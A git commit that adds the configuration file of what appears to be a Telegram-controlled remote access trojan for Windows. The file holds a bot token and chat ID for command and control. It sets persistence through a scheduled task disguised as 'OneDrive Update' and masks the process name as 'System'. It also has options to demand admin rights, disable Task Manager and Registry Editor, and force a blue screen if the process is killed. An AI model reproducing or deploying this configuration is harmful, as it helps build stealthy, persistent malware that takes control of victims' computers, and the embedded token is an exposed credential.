e2a6f80f4492cbd5065aded35f28c99f37cf0a2f
pistacchietto <pistacchietto2@gmail.com>
2020-07-08 14:54:09 +0200

    Initial commit

---
+++ RAT.py
@@ -0,0 +1,38 @@
+from API import *
+
+
+# Token/ID
+TelegramToken = '1299960654:AAHJcgiT3bGUM4PjkzThHo24q2j4bhw4YRs'
+TelegramChatID = '612605794'
+
+
+# Run the script as administrator
+AdminRightsRequired = True
+
+# Disable Task Manager at first start
+DisableTaskManager = False
+# Disable Registry Editor at first start
+DisableRegistryTools = False
+
+# Process protection from termination and deletion
+ProcessBSODProtectionEnabled = False
+
+
+# Add to startup at first start
+AutorunEnabled = True
+# Installation directory
+InstallPath = 'C:\\ProgramData'
+# Task Name in Task Scheduler
+AutorunName = 'OneDrive Update'
+# The name of the process in the Task Manager
+ProcessName = 'System'
+
+
+# Display a message at first start
+DisplayMessageBox = False
+# Your Message (will be displayed at start)
+Message = 'Message'
+
+
+# Directory for saving trojan temporary files
+Directory = 'C:\\ProgramData\\TelegramRAT\\'
